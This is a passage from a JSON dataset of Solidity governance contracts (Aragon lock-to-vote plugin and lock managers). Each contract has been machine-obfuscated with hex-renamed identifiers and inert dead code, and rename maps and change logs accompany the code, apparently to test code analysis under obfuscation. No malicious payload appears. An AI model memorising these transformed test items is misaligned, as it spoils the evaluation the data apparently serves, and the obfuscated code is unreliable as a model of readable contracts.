_0xf5a104._0x382c2d(_0x8c2b0f);\n    }\n\n    /// @inheritdoc ILockToVote\n    /// @dev Reverts if the proposal with the given `_proposalId` does not exist.\n    function _0x51a7a5(uint256 _0x1807c8, address _0x9c8ea7, VoteOption _0x1a589d) public view returns (bool) {\n        if (!_0x7ee6bf(_0x1807c8)) {\n            revert NonexistentProposal(_0x1807c8);\n        }\n\n        Proposal storage _0x466f09 = _0xa8d22f[_0x1807c8];\n        return _0x5909f3(_0x466f09, _0x9c8ea7, _0x1a589d, _0xf5a104._0x5e4d25(_0x9c8ea7));\n    }\n\n    /// @inheritdoc ILockToVote\n    function _0xe180c5(uint256 _0x1807c8, address _0x9c8ea7, VoteOption _0x1a589d, uint256 _0x298297)\n        public\n        override\n        _0x7c9a77(LOCK_MANAGER_PERMISSION_ID)\n    {\n        Proposal storage _0x466f09 = _0xa8d22f[_0x1807c8];\n\n        if (!_0x5909f3(_0x466f09, _0x9c8ea7, _0x1a589d, _0x298297)) {\n            revert VoteCastForbidden(_0x1807c8, _0x9c8ea7);\n        }\n\n        // Same vote\n        if (_0x1a589d == _0x466f09._0xf8e1fa[_0x9c8ea7]._0x731b00) {\n            // Same value, nothing to do\n            if (_0x298297 == _0x466f09._0xf8e1fa[_0x9c8ea7]._0xbacf3c) return;\n\n            // More balance\n            /// @dev diff > 0 is guaranteed, as _canVote() above will return false and revert otherwise\n            uint256 _0xe598aa = _0x298297 - _0x466f09._0xf8e1fa[_0x9c8ea7]._0xbacf3c;\n            _0x466f09._0xf8e1fa[_0x9c8ea7]._0xbacf3c = _0x298297;\n\n            if (_0x466f09._0xf8e1fa[_0x9c8ea7]._0x731b00 == VoteOption.Yes) {\n                _0x466f09._0xac6a7c._0xfcddb9 += _0xe598aa;\n            } else if (_0x466f09._0xf8e1fa[_0x9c8ea7]._0x731b00 == VoteOption.No) {\n                _0x466f09._0xac6a7c._0x835676 += _0xe598aa;\n            } else {\n                /// @dev Voting none is not possible, as _canVote() above will return false and revert if so\n                _0x466f09._0xac6a7c._0xefa164 += _0xe598aa;\n            }\n        } else {\n            /// @dev VoteReplacement has already been enforced by _canVote()\n\n            // Was there a vote?\n            if (_0x466f09._0xf8e1fa[_0x9c8ea7]._0xbacf3c > 0) {\n                // Undo that vote\n                if (_0x466f09._0xf8e1fa[_0x9c8ea7]._0x731b00 == VoteOption.Yes) {\n                    _0x466f09._0xac6a7c._0xfcddb9 -= _0x466f09._0xf8e1fa[_0x9c8ea7]._0xbacf3c;\n                } else if (_0x466f09._0xf8e1fa[_0x9c8ea7]._0x731b00 == VoteOption.No) {\n                    _0x466f09._0xac6a7c._0x835676 -= _0x466f09._0xf8e1fa[_0x9c8ea7]._0xbacf3c;\n                } else {\n                    /// @dev Voting none is not possible, only abstain is left\n                    _0x466f09._0xac6a7c._0xefa164 -= _0x466f09._0xf8e1fa[_0x9c8ea7]._0xbacf3c;\n                }\n            }\n\n            // Register the new vote\n            if (_0x1a589d == VoteOption.Yes) {\n                _0x466f09._0xac6a7c._0xfcddb9 += _0x298297;\n            } else if (_0x1a589d == VoteOption.No) {\n                _0x466f09._0xac6a7c._0x835676 += _0x298297;\n            } else {\n                /// @dev Voting none is not possible, only abstain is left\n                _0x466f09._0xac6a7c._0xefa164 += _0x298297;\n            }\n            _0x466f09._0xf8e1fa[_0x9c8ea7]._0x731b00 = _0x1a589d;\n            _0x466f09._0xf8e1fa[_0x9c8ea7]._0xbacf3c = _0x298297;\n        }\n\n        emit VoteCast(_0x1807c8, _0x9c8ea7, _0x1a589d, _0x298297);\n\n        if (_0x466f09._0x33af98._0xec22b1 == VotingMode.EarlyExecution) {\n            _0x32229c(_0x1807c8, _0x34f20a());\n        }\n    }\n\n    /// @inheritdoc ILockToVote\n    function _0xc9006a(uint256 _0x1807c8, address _0x9c8ea7) external _0x7c9a77(LOCK_MANAGER_PERMISSION_ID) {\n        Proposal storage _0x466f09 = _0xa8d22f[_0x1807c8];\n        if (!_0x870635(_0x466f09)) {\n            revert VoteRemovalForbidden(_0x1807c8, _0x9c8ea7);\n        } else if (_0x466f09._0x33af98._0xec22b1 != VotingMode.VoteReplacement) {\n            revert VoteRemovalForbidden(_0x1807c8, _0x9c8ea7);\n        } else if (_0x466f09._0xf8e1fa[_0x9c8ea7]._0xbacf3c == 0) {\n            // Nothing to do\n            return;\n        }\n\n        // Undo that vote\n        if (_0x466f09._0xf8e1fa[_0x9c8ea7]._0x731b00 == VoteOption.Yes) {\n            _0x466f09._0xac6a7c._0xfcddb9 -= _0x466f09._0xf8e1fa[_0x9c8ea7]._0xbacf3c;\n        } else if (_0x466f09._0xf8e1fa[_0x9c8ea7]._0x731b00 == VoteOption.No) {\n            _0x466f09._0xac6a7c._0x835676 -= _0x466f09._0xf8e1fa[_0x9c8ea7]._0xbacf3c;\n        }\n        /// @dev Double checking for abstain, even though canVote prevents any other voteOption value\n        else if (_0x466f09._0xf8e1fa[_0x9c8ea7]._0x731b00 == VoteOption.Abstain) {\n            _0x466f09._0xac6a7c._0xefa164 -= _0x466f09._0xf8e1fa[_0x9c8ea7]._0xbacf3c;\n        }\n        _0x466f09._0xf8e1fa[_0x9c8ea7]._0xbacf3c = 0;\n\n        emit VoteCleared(_0x1807c8, _0x9c8ea7);\n    }\n\n    /// @inheritdoc ILockToGovernBase\n    function _0x234e38(uint256 _0x1807c8) external view returns (bool) {\n        Proposal storage _0x466f09 = _0xa8d22f[_0x1807c8];\n        return _0x870635(_0x466f09);\n    }\n\n    /// @inheritdoc MajorityVotingBase\n    function _0xf3da05() public view override(ILockToGovernBase, MajorityVotingBase) returns (uint256) {\n        return MajorityVotingBase._0xf3da05();\n    }\n\n    /// @inheritdoc MajorityVotingBase\n    function _0xd436e2() public view override returns (uint256) {\n        return IERC20(_0xf5a104._0x96ec55())._0x59e08e();\n    }\n\n    /// @inheritdoc ILockToGovernBase\n    function _0x9fb1d6(uint256 _0x1807c8, address _0x9c8ea7) public view returns (uint256) {\n        return _0xa8d22f[_0x1807c8]._0xf8e1fa[_0x9c8ea7]._0xbacf3c;\n    }\n\n    // Internal helpers\n\n    function _0x5909f3(Proposal storage _0x466f09, address _0x9c8ea7, VoteOption _0x1a589d, uint256 _0x298297)\n        internal\n        view\n        returns (bool)\n    {\n        uint256 _0x1426fb = _0x466f09._0xf8e1fa[_0x9c8ea7]._0xbacf3c;\n\n        // The proposal vote hasn't started or has already ended.\n        if (!_0x870635(_0x466f09)) {\n            return false;\n        } else if (_0x1a589d == VoteOption.None) {\n            return false;\n        }\n        // Standard voting + early execution\n        else if (_0x466f09._0x33af98._0xec22b1 != VotingMode.VoteReplacement) {\n            // Lowering the existing voting power (or the same) is not allowed\n            if (_0x298297 <= _0x1426fb) {\n                return false;\n            }\n            // The voter already voted a different option but vote replacment is not allowed.\n            else if (\n                _0x466f09._0xf8e1fa[_0x9c8ea7]._0x731b00 != VoteOption.None\n                    && _0x1a589d != _0x466f09._0xf8e1fa[_0x9c8ea7]._0x731b00\n            ) {\n                return false;\n            }\n        }\n        // Vote replacement mode\n        else {\n            // Lowering the existing voting power is not allowed\n            if (_0x298297 == 0 || _0x298297 < _0x1426fb) {\n                return false;\n            }\n            // Voting the same option with the same balance is not allowed\n            else if (_0x298297 == _0x1426fb && _0x1a589d == _0x466f09._0xf8e1fa[_0x9c8ea7]._0x731b00) {\n                return false;\n            }\n        }\n\n        return true;\n    }\n\n    function _0x32229c(uint256 _0x1807c8, address _0x1cf859) internal {\n        if (!_0xf54abd(_0x1807c8)) {\n            return;\n        } else if (!_0x825a6b()._0x61a916(address(this), _0x1cf859, EXECUTE_PROPOSAL_PERMISSION_ID, _0x3e037c())) {\n            return;\n        }\n\n        _0xf84c20(_0x1807c8);\n    }\n\n    function _0xf84c20(uint256 _0x1807c8) internal override {\n        super._0xf84c20(_0x1807c8);\n\n        // Notify the LockManager to stop tracking this proposal ID\n        _0xf5a104._0xc8fffd(_0x1807c8);\n    }\n\n    /// @notice This empty reserved space is put in place to allow future versions to add\n    /// new variables without shifting down storage in the inheritance chain\n    /// (see [OpenZeppelin's guide about storage gaps]\n    /// (https://docs.openzeppelin.com/contracts/4.x/upgradeable#storage_gaps)).\n    uint256[50] private __gap;\n}\n",
      "rename_map": {
        "onlyCallAtInitialization": "_0xc5a337",
        "customProposalParamsABI": "_0xf13b8b",
        "minProposerVotingPower": "_0xf3da05",
        "_attemptEarlyExecution": "_0x32229c",
        "_validateProposalDates": "_0x261fe4",
        "supportThresholdRatio": "_0xcb81a6",
        "minParticipationRatio": "_0x5680b0",
        "_currentVotingPower": "_0x1426fb",
        "currentTokenSupply": "_0xd436e2",
        "_createProposalId": "_0x0de2b5",
        "supportsInterface": "_0x8fd1ab",
        "definingContract": "_0xa7ab3b",
        "minApprovalRatio": "_0x6762a0",
        "_allowFailureMap": "_0x2fd843",
        "getLockedBalance": "_0x5e4d25",
        "_votingSettings": "_0xf2cea6",
        "_proposalExists": "_0x7ee6bf",
        "_newVotingPower": "_0x298297",
        "getTargetConfig": "_0x964e1a",
        "usedVotingPower": "_0x9fb1d6",
        "_isProposalOpen": "_0x870635",
        "proposalCreated": "_0x382c2d",
        "_pluginMetadata": "_0xc6b7ef",
        "allowFailureMap": "_0x0f782c",
        "isProposalOpen": "_0x234e38",
        "createProposal": "_0x2d9668",
        "proposalEnded": "_0xc8fffd",
        "_targetConfig": "_0x0c9599",
        "hasPermission": "_0x61a916",
        "reinitializer": "_0x1f05c7",
        "_lockManager": "_0xd240d6",
        "_interfaceId": "_0x6f6449",
        "targetConfig": "_0xb61a10",
        "_canExecute": "_0xf54abd",
        "_voteCaller": "_0x1cf859",
        "_proposalId": "_0x1807c8",
        "interfaceId": "_0xd226f5",
        "_voteOption": "_0x1a589d",
        "totalSupply": "_0x59e08e",
        "lockManager": "_0xf5a104",
        "votingPower": "_0xbacf3c",
        "proposalId": "_0x8c2b0f",
        "parameters": "_0x33af98",
        "voteOption": "_0x731b00",
        "votingMode": "_0xec22b1",
        "_msgSender": "_0x34f20a",
        "_startDate": "_0xcf8488",
        "initialize": "_0x4a4cec",
        "proposals": "_0xa8d22f",
        "startDate": "_0x9f3511",
        "_metadata": "_0xd3f13c",
        "proposal_": "_0x466f09",
        "clearVote": "_0xc9006a",
        "keccak256": "_0x540c74",
        "_canVote": "_0x5909f3",
        "_execute": "_0xf84c20",
        "_endDate": "_0x8844df",
        "_msgData": "_0x3e037c",
        "_actions": "_0x9b032f",
        "abstain": "_0xefa164",
        "actions": "_0x298e26",
        "canVote": "_0x51a7a5",
        "endDate": "_0xb1c0fd",
        "decode": "_0x441ead",
        "encode": "_0x11520e",
        "_voter": "_0x9c8ea7",
        "tally": "_0xac6a7c",
        "voter": "_0x8ed3f4",
        "token": "_0x96ec55",
        "votes": "_0xf8e1fa",
        "_data": "_0x6d8c07",
        "diff": "_0xe598aa",
        "auth": "_0x7c9a77",
        "vote": "_0xe180c5",
        "_dao": "_0xc10fdc",
        "yes": "_0xfcddb9",
        "dao": "_0x825a6b",
        "no": "_0x835676"
      },
      "changes": [
        "Renamed 78 identifiers using hex style",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_gs_013",
      "transformed_id": "ss_l4_medium_sn_gs_013",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: AGPL-3.0-or-later\npragma solidity ^0.8.13;\n\nimport {LockManagerBase} from \"./base/LockManagerBase.sol\";\nimport {ILockManager} from \"./interfaces/ILockManager.sol\";\nimport {LockManagerSettings} from \"./interfaces/ILockManager.sol\";\nimport {IERC20} from \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\n\n/// @title LockManagerERC20\n/// @author Aragon X 2025\n/// @notice Helper contract acting as the vault for locked tokens used to vote on multiple plugins and proposals.\ncontract LockManagerERC20 is ILockManager, LockManagerBase {\n    /// @notice The address of the token contract used to determine the voting power\n    IERC20 private immutable _0xc4e4f7;\n\n    /// @param _settings The operation mode of the contract (plugin mode)\n    /// @param _token The address of the token contract that users can lock\n    constructor(LockManagerSettings memory _0x7637de, IERC20 _0x39400c) LockManagerBase(_0x7637de) {\n        _0xc4e4f7 = _0x39400c;\n    }\n\n    /// @inheritdoc ILockManager\n    /// @dev Not having `token` as a public variable because the return types would differ (address vs IERC20)\n    function _0x2f6dcf() public view virtual returns (address _0x39400c) {\n        bool _flag1 = false;\n        uint256 _unused2 = 0;\n        return address(_0xc4e4f7);\n    }\n\n    // Overrides\n\n    /// @inheritdoc LockManagerBase\n    function _0xdb0c91() internal view virtual override returns (uint256) {\n        // Placeholder for future logic\n        if (false) { revert(); }\n        return _0xc4e4f7._0x6b8df5(msg.sender, address(this));\n    }\n\n    /// @inheritdoc LockManagerBase\n    function _0x5e4705(uint256 _0xa8c582) internal virtual override {\n        _0xc4e4f7._0xdf96a8(msg.sender, address(this), _0xa8c582);\n    }\n\n    /// @inheritdoc LockManagerBase\n    function _0x595de3(address _0x324363, uint256 _0xa8c582) internal virtual override {\n        _0xc4e4f7.transfer(_0x324363, _0xa8c582);\n    }\n}\n",
      "rename_map": {
        "_incomingTokenBalance": "_0xdb0c91",
        "_doUnlockTransfer": "_0x595de3",
        "_doLockTransfer": "_0x5e4705",
        "transferFrom": "_0xdf96a8",
        "_recipient": "_0x324363",
        "erc20Token": "_0xc4e4f7",
        "_settings": "_0x7637de",
        "allowance": "_0x6b8df5",
        "_amount": "_0xa8c582",
        "_token": "_0x39400c",
        "token": "_0x2f6dcf"
      },
      "changes": [
        "Renamed 11 identifiers using hex style",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_gs_014",
      "transformed_id": "ss_l4_medium_sn_gs_014",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: AGPL-3.0-or-later\npragma solidity ^0.8.13;\n\nimport {LockManagerBase} from \"./base/LockManagerBase.sol\";\nimport {ILockManager} from \"./interfaces/ILockManager.sol\";\nimport {LockManagerSettings} from \"./interfaces/ILockManager.sol\";\nimport {IERC20} from \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\n\n/// @title LockManagerERC20\n/// @author Aragon X 2025\n/// @notice Helper contract acting as the vault for locked tokens used to vote on multiple plugins and proposals.\ncontract LockManagerERC20 is ILockManager, LockManagerBase {\n    /// @notice The address of the token contract used to determine the voting power\n    IERC20 private immutable _0xb3fbc0;\n\n    /// @param _settings The operation mode of the contract (plugin mode)\n    /// @param _token The address of the token contract that users can lock\n    constructor(LockManagerSettings memory _0x857fbd, IERC20 _0xb10872) LockManagerBase(_0x857fbd) {\n        _0xb3fbc0 = _0xb10872;\n    }\n\n    /// @inheritdoc ILockManager\n    /// @dev Not having `token` as a public variable because the return types would differ (address vs IERC20)\n    function _0xa869d7() public view virtual returns (address _0xb10872) {\n        bool _flag1 = false;\n        // Placeholder for future logic\n        return address(_0xb3fbc0);\n    }\n\n    // Overrides\n\n    /// @inheritdoc LockManagerBase\n    function _0xd0bc8e() internal view virtual override returns (uint256) {\n        if (false) { revert(); }\n        if (false) { revert(); }\n        return _0xb3fbc0._0x8eb333(msg.sender, address(this));\n    }\n\n    /// @inheritdoc LockManagerBase\n    function _0x1dc74c(uint256 _0xb182eb) internal virtual override {\n        _0xb3fbc0._0x8aeb8a(msg.sender, address(this), _0xb182eb);\n    }\n\n    /// @inheritdoc LockManagerBase\n    function _0x55e3ff(address _0x123826, uint256 _0xb182eb) internal virtual override {\n        _0xb3fbc0.transfer(_0x123826, _0xb182eb);\n    }\n}\n",
      "rename_map": {
        "_incomingTokenBalance": "_0xd0bc8e",
        "_doUnlockTransfer": "_0x55e3ff",
        "_doLockTransfer": "_0x1dc74c",
        "transferFrom": "_0x8aeb8a",
        "_recipient": "_0x123826",
        "erc20Token": "_0xb3fbc0",
        "_settings": "_0x857fbd",
        "allowance": "_0x8eb333",
        "_amount": "_0xb182eb",
        "_token": "_0xb10872",
        "token": "_0xa869d7"
      },
      "changes": [
        "Renamed 11 identifiers using hex style",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_gs_015",
      "transformed_id": "ss_l4_medium_sn_gs_015",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: AGPL-3.0-or-later\npragma solidity ^0.8.13;\n\nimport {ILockManager, LockManagerSettings, PluginMode} from \"../interfaces/ILockManager.sol\";\nimport {ILockToGovernBase} from \"../interfaces/ILockToGovernBase.sol\";\nimport {ILockToVote} from \"../interfaces/ILockToVote.sol\";\nimport {IMajorityVoting} from \"../interfaces/IMajorityVoting.sol\";\nimport \"@openzeppelin/contracts/utils/introspection/IERC165.sol\";\nimport {EnumerableSet} from \"@openzeppelin/contracts/utils/structs/EnumerableSet.sol\";\n\n/// @title LockManagerBase\n/// @author Aragon X 2025\n/// @notice Helper contract acting as the vault for locked tokens used to vote on multiple plugins and proposals.\nabstract contract LockManagerBase is ILockManager {\n    using EnumerableSet for EnumerableSet.UintSet;\n\n    /// @notice The current LockManager settings\n    LockManagerSettings public _0x4bf447;\n\n    /// @notice The address of the lock to vote plugin to use\n    ILockToGovernBase public _0x976d00;\n\n    /// @notice Keeps track of the amount of tokens locked by address\n    mapping(address => uint256) private _0x3fb2e2;\n\n    /// @notice Keeps track of the known active proposal ID's\n    /// @dev NOTE: Executed proposals will be actively reported, but defeated proposals will need to be garbage collected over time.\n    EnumerableSet.UintSet internal _0xa2422a;\n\n    /// @notice Emitted when a token holder locks funds into the manager contract\n    event BalanceLocked(address _0x67b7d0, uint256 _0x1175cd);\n\n    /// @notice Emitted when a token holder unlocks funds from the manager contract\n    event BalanceUnlocked(address _0x67b7d0, uint256 _0x1175cd);\n\n    /// @notice Emitted when the plugin reports a proposal as ended\n    /// @param proposalId The ID the proposal where votes can no longer be submitted or cleared\n    event ProposalEnded(uint256 _0x36ea56);\n\n    /// @notice Thrown when the address calling proposalEnded() is not the plugin's\n    error InvalidPluginAddress();\n\n    /// @notice Raised when the caller holds no tokens or didn't lock any tokens\n    error NoBalance();\n\n    /// @notice Raised when attempting to unlock while active votes are cast in strict mode\n    error LocksStillActive();\n\n    /// @notice Thrown when trying to set an invalid contract as the plugin\n    error InvalidPlugin();\n\n    /// @notice Thrown when trying to set an invalid PluginMode value, or when trying to use an operation not supported by the current pluginMode\n    error InvalidPluginMode();\n\n    /// @notice Thrown when trying to define the address of the plugin after it already was\n    error SetPluginAddressForbidden();\n\n    /// @param _settings The operation mode of the contract (plugin mode)\n    constructor(LockManagerSettings memory _0x944960) {\n        _0x4bf447._0xdb28eb = _0x944960._0xdb28eb;\n    }\n\n    /// @notice Returns the known proposalID at the given index\n    function _0xba317c(uint256 _0xbd1b11) public view virtual returns (uint256) {\n        // Placeholder for future logic\n        bool _flag2 = false;\n        return _0xa2422a._0x18ee3b(_0xbd1b11);\n    }\n\n    /// @notice Returns the number of known proposalID's\n    function _0x80f6ec() public view virtual returns (uint256) {\n        if (false) { revert(); }\n        uint256 _unused4 = 0;\n        return _0xa2422a.length();\n    }\n\n    /// @inheritdoc ILockManager\n    function _0xba62e3() public virtual {\n        _0xcd731d(_0xe0e9e4());\n    }\n\n    /// @inheritdoc ILockManager\n    function _0xba62e3(uint256 _0x9e3f8b) public virtual {\n        _0xcd731d(_0x9e3f8b);\n    }\n\n    /// @inheritdoc ILockManager\n    function _0xcc1f12(uint256 _0x5c2bf9, IMajorityVoting.VoteOption _0x428506) public virtual {\n        if (_0x4bf447._0xdb28eb != PluginMode.Voting) {\n            revert InvalidPluginMode();\n        }\n\n        _0xcd731d(_0xe0e9e4());\n        _0xc843db(_0x5c2bf9, _0x428506);\n    }\n\n    /// @inheritdoc ILockManager\n    function _0xcc1f12(uint256 _0x5c2bf9, IMajorityVoting.VoteOption _0x428506, uint256 _0x9e3f8b) public virtual {\n        if (_0x4bf447._0xdb28eb != PluginMode.Voting) {\n            revert InvalidPluginMode();\n        }\n\n        _0xcd731d(_0x9e3f8b);\n        _0xc843db(_0x5c2bf9, _0x428506);\n    }\n\n    /// @inheritdoc ILockManager\n    function _0xca17ca(uint256 _0x5c2bf9, IMajorityVoting.VoteOption _0x428506) public virtual {\n        if (_0x4bf447._0xdb28eb != PluginMode.Voting) {\n            revert InvalidPluginMode();\n        }\n\n        _0xc843db(_0x5c2bf9, _0x428506);\n    }\n\n    /// @inheritdoc ILockManager\n    function _0x2b6123(address _0x2f3b8f) public view virtual returns (uint256) {\n        return _0x3fb2e2[_0x2f3b8f];\n    }\n\n    /// @inheritdoc ILockManager\n    function _0x962c4a(uint256 _0x5c2bf9, address _0x0f9eac, IMajorityVoting.VoteOption _0x428506)\n        external\n        view\n        virtual\n        returns (bool)\n    {\n        return ILockToVote(address(_0x976d00))._0x962c4a(_0x5c2bf9, _0x0f9eac, _0x428506);\n    }\n\n    /// @inheritdoc ILockManager\n    function _0xb7e5a9() public virtual {\n        uint256 _0x378b17 = _0x2b6123(msg.sender);\n        if (_0x378b17 == 0) {\n            revert NoBalance();\n        }\n\n        /// @dev The plugin may decide to revert if its voting mode doesn't allow for it\n        _0x82423d();\n\n        // All votes clear\n\n        _0x3fb2e2[msg.sender] = 0;\n\n        // Withdraw\n        _0xd815d6(msg.sender, _0x378b17);\n        emit BalanceUnlocked(msg.sender, _0x378b17);\n    }\n\n    /// @inheritdoc ILockManager\n    function _0xcd681f(uint256 _0x5c2bf9) public virtual {\n        if (msg.sender != address(_0x976d00)) {\n            revert InvalidPluginAddress();\n        }\n\n        // @dev Not checking for duplicate proposalId's\n        // @dev Both plugins already enforce unicity\n\n        _0xa2422a._0xf48276(_0x5c2bf9);\n    }\n\n    /// @inheritdoc ILockManager\n    function _0x2d0280(uint256 _0x5c2bf9) public virtual {\n        if (msg.sender != address(_0x976d00)) {\n            revert InvalidPluginAddress();\n        }\n\n        emit ProposalEnded(_0x5c2bf9);\n        _0xa2422a._0xb2c4a1(_0x5c2bf9);\n    }\n\n    /// @inheritdoc ILockManager\n    function _0x774232(ILockToGovernBase _0xdaaebf) public virtual {\n        if (address(_0x976d00) != address(0)) {\n            revert SetPluginAddressForbidden();\n        } else if (!IERC165(address(_0xdaaebf))._0xf06eff(type(ILockToGovernBase)._0x819f4d)) {\n            revert InvalidPlugin();\n        }\n        // Is it the right type of plugin?\n        else if (\n            _0x4bf447._0xdb28eb == PluginMode.Voting\n                && !IERC165(address(_0xdaaebf))._0xf06eff(type(ILockToVote)._0x819f4d)\n        ) {\n            revert InvalidPlugin();\n        }\n\n        _0x976d00 = _0xdaaebf;\n    }\n\n    // Internal\n\n    /// @notice Returns the amount of tokens that LockManager receives or can transfer from msg.sender\n    function _0xe0e9e4() internal view virtual returns (uint256);\n\n    /// @notice Takes the user's tokens and registers the received amount.\n    function _0xcd731d(uint256 _0x9e3f8b) internal virtual {\n        if (_0x9e3f8b == 0) {\n            revert NoBalance();\n        }\n\n        /// @dev Reverts if not enough balance is approved\n        _0xcc0e34(_0x9e3f8b);\n\n        _0x3fb2e2[msg.sender] += _0x9e3f8b;\n        emit BalanceLocked(msg.sender, _0x9e3f8b);\n    }\n\n    /// @notice Triggers the transfer needed in order to complete the token locking flow.\n    ///     Reverts if the requested amount cannot be locked.\n    function _0xcc0e34(uint256 _0x9e3f8b) internal virtual;\n\n    /// @notice Transfers the requested amount of tokens to the recipient\n    /// @param _recipient The address that will receive the locked tokens back\n    /// @param _amount The amount of tokens that the recipient will get\n    function _0xd815d6(address _0x056080, uint256 _0x9e3f8b) internal virtual;\n\n    function _0xc843db(uint256 _0x5c2bf9, IMajorityVoting.VoteOption _0x428506) internal virtual {\n        uint256 _0x4a9581 = _0x2b6123(msg.sender);\n\n        /// @dev The voting power value is checked within plugin.vote()\n\n        ILockToVote(address(_0x976d00))._0xca17ca(_0x5c2bf9, msg.sender, _0x428506, _0x4a9581);\n    }\n\n    function _0x82423d() internal virtual {\n        uint256 _0x2513c5 = _0xa2422a.length();\n        for (uint256 _0xae7d10; _0xae7d10 < _0x2513c5;) {\n            uint256 _0x5c2bf9 = _0xa2422a._0x18ee3b(_0xae7d10);\n            if (!_0x976d00._0xc6747c(_0x5c2bf9)) {\n                _0xa2422a._0xb2c4a1(_0x5c2bf9);\n                _0x2513c5 = _0xa2422a.length();\n\n                // Were we at the last element?\n                if (_0xae7d10 == _0x2513c5) {\n                    return;\n                }\n\n                // Recheck the same index (now, another proposalId)\n                continue;\n            }\n\n            if (_0x976d00._0x4de282(_0x5c2bf9, msg.sender) > 0) {\n                ILockToVote(address(_0x976d00))._0x4b5307(_0x5c2bf9, msg.sender);\n            }\n\n            unchecked {\n                _0xae7d10++;\n            }\n        }\n    }\n}\n",
      "rename_map": {
        "_withdrawActiveVotingPower": "_0x82423d",
        "knownProposalIdsLength": "_0x80f6ec",
        "_incomingTokenBalance": "_0xe0e9e4",
        "_currentVotingPower": "_0x4a9581",
        "_refundableBalance": "_0x378b17",
        "supportsInterface": "_0xf06eff",
        "knownProposalIdAt": "_0xba317c",
        "_doUnlockTransfer": "_0xd815d6",
        "_newPluginAddress": "_0xdaaebf",
        "knownProposalIds": "_0xa2422a",
        "setPluginAddress": "_0x774232",
        "getLockedBalance": "_0x2b6123",
        "_doLockTransfer": "_0xcc0e34",
        "proposalCreated": "_0xcd681f",
        "usedVotingPower": "_0x4de282",
        "lockedBalances": "_0x3fb2e2",
        "isProposalOpen": "_0xc6747c",
        "_proposalCount": "_0x2513c5",
        "proposalEnded": "_0x2d0280",
        "interfaceId": "_0x819f4d",
        "_voteOption": "_0x428506",
        "lockAndVote": "_0xcc1f12",
        "_proposalId": "_0x5c2bf9",
        "pluginMode": "_0xdb28eb",
        "_recipient": "_0x056080",
        "proposalId": "_0x36ea56",
        "_settings": "_0x944960",
        "clearVote": "_0x4b5307",
        "settings": "_0x4bf447",
        "_account": "_0x2f3b8f",
        "canVote": "_0x962c4a",
        "_amount": "_0x9e3f8b",
        "amount": "_0x1175cd",
        "unlock": "_0xb7e5a9",
        "_index": "_0xbd1b11",
        "remove": "_0xb2c4a1",
        "_voter": "_0x0f9eac",
        "plugin": "_0x976d00",
        "_lock": "_0xcd731d",
        "voter": "_0x67b7d0",
        "_vote": "_0xc843db",
        "vote": "_0xca17ca",
        "lock": "_0xba62e3",
        "add": "_0xf48276",
        "at": "_0x18ee3b",
        "_i": "_0xae7d10"
      },
      "changes": [
        "Renamed 46 identifiers using hex style",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_gs_016",
      "transformed_id": "ss_l4_medium_sn_gs_016",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: AGPL-3.0-or-later\npragma solidity ^0.8.13;\n\nimport {ILockManager} from \"./interfaces/ILockManager.sol\";\nimport {LockToGovernBase} from \"./base/LockToGovernBase.sol\";\nimport {ILockToVote} from \"./interfaces/ILockToVote.sol\";\nimport {IDAO} from \"@aragon/osx-commons-contracts/src/dao/IDAO.sol\";\nimport {Action} from \"@aragon/osx-commons-contracts/src/executors/IExecutor.sol\";\nimport {IPlugin} from \"@aragon/osx-commons-contracts/src/plugin/IPlugin.sol\";\nimport {IERC20} from \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport {IProposal} from \"@aragon/osx-commons-contracts/src/plugin/extensions/proposal/IProposal.sol\";\nimport {ERC165Upgradeable} from \"@openzeppelin/contracts-upgradeable/utils/introspection/ERC165Upgradeable.sol\";\nimport {SafeCastUpgradeable} from \"@openzeppelin/contracts-upgradeable/utils/math/SafeCastUpgradeable.sol\";\nimport {MajorityVotingBase} from \"./base/MajorityVotingBase.sol\";\nimport {ILockToGovernBase} from \"./interfaces/ILockToGovernBase.sol\";\n\ncontract LockToVotePlugin is ILockToVote, MajorityVotingBase, LockToGovernBase {\n    using SafeCastUpgradeable for uint256;\n\n    /// @notice The [ERC-165](https://eips.ethereum.org/EIPS/eip-165) interface ID of the contract.\n    bytes4 internal constant LOCK_TO_VOTE_INTERFACE_ID =\n        this._0xd76d33.selector ^ this._0x11a90f.selector;\n\n    /// @notice The ID of the permission required to call the `createProposal` functions.\n    bytes32 public constant CREATE_PROPOSAL_PERMISSION_ID = _0xbc8a32(\"CREATE_PROPOSAL_PERMISSION\");\n\n    /// @notice The ID of the permission required to call `vote` and `clearVote`.\n    bytes32 public constant LOCK_MANAGER_PERMISSION_ID = _0xbc8a32(\"LOCK_MANAGER_PERMISSION\");\n\n    event VoteCleared(uint256 _0x1a88a9, address _0x8b08c6);\n\n    error VoteRemovalForbidden(uint256 _0x1a88a9, address _0x8b08c6);\n\n    /// @notice Initializes the component.\n    /// @dev This method is required to support [ERC-1822](https://eips.ethereum.org/EIPS/eip-1822).\n    /// @param _dao The IDAO interface of the associated DAO.\n    /// @param _votingSettings The voting settings.\n    /// @param _targetConfig Configuration for the execution target, specifying the target address and operation type\n    ///     (either `Call` or `DelegateCall`). Defined by `TargetConfig` in the `IPlugin` interface,\n    ///     part of the `osx-commons-contracts` package, added in build 3.\n    /// @param _pluginMetadata The plugin specific information encoded in bytes.\n    ///     This can also be an ipfs cid encoded in bytes.\n    function _0x77d04a(\n        IDAO _0xfa7867,\n        ILockManager _0xce1cee,\n        VotingSettings calldata _0xadeb8f,\n        IPlugin.TargetConfig calldata _0xe7c88b,\n        bytes calldata _0xce7679\n    ) external _0x67b3f6 _0x37be0a(1) {\n        // Placeholder for future logic\n        // Placeholder for future logic\n        __MajorityVotingBase_init(_0xfa7867, _0xadeb8f, 